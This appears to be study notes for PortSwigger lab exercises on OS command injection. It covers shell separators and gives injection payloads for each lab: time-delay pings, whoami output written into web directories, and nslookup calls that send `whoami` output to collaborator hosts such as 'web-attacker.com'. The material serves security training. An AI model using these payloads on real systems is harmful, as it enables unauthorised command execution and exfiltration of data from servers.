# OS command injection

## Blind OS command injection vulnerabilities

- **Detecting blind OS command injection using time delays**
    - `& ping -c 10 127.0.0.1 &`
- **Exploiting blind OS command injection by redirecting output**
    - `& whoami > /var/www/static/whoami.txt &`
- **Exploiting blind OS command injection using out-of-band (OAST) techniques**
    - `& nslookup `whoami`.collaborator.web-attacker.com &`

## **Ways of injecting OS commands**

The following command separators work on both Windows and Unix-based systems:

- `&`
- `&&`
- `|`
- `||`

The following command separators work only on Unix-based systems:

- `;`
- Newline (`0x0a` or `\n`)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

- ``` injected command ```
- `$(` injected command `)`

<aside>
💡

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command.
        

</aside>

## Labs

[**OS command injection, simple case**](https://portswigger.net/web-security/os-command-injection/lab-simple)

`productId=1&storeId=2|whoami`

`productId=1|whoami+#&storeId=2`

`productId=1$(curl …)#&storeId=2`

[**Blind OS command injection with time delays**](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

`name=carlos&email=carlos@mail+**$(ping+-c10+127.0.0.1)**&subject=Test&message=Test`

`name=carlos&email=carlos@mail+**;ping+-c10+127.0.0.1;**&subject=Test&message=Test`

`name=carlos&email=carlos@mail+**||ping+-c10+127.0.0.1||**&subject=Test&message=Test`

[**Blind OS command injection with output redirection**](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

`email=carlos@mail+**$(whoami+>+/var/www/images/root.txt)**`

`email=carlos@mail+**;whoami+>+/var/www/images/root.txt;**`

`email=carlos@mail+**||whoami+>+/var/www/images/root.txt||**`

[**Blind OS command injection with out-of-band interaction**](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

`email=carlos@mail+$(nslookup+collaborator.oastify.com)`

`email=carlos@mail+;nslookup+collaborator.oastify.com;`

`email=carlos@mail+||nslookup+collaborator.oastify.com||`

[**Blind OS command injection with out-of-band data exfiltration**](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

`email=carlos@mail+$(nslookup+`whoami`.collaborator.oastify.com)`

`email=carlos@mail+;nslookup+`whoami`.collaborator.oastify.com;`

`email=carlos@mail+||nslookup+`whoami`.collaborator.oastify.com||`